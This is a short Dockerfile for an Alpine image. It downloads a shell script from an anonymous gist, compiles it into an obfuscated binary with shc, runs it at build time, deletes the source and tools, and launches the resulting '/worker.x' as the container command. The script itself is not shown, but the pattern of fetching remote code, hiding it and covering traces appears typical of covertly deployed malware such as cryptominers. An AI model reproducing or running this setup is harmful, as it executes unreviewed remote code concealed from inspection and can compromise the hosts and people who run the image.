FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/111kb/00200d02aabbdafa0d1b88622e35644c/raw/f64cf2e6c28c4484ca596ab336196e12f9574654/vitwo

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
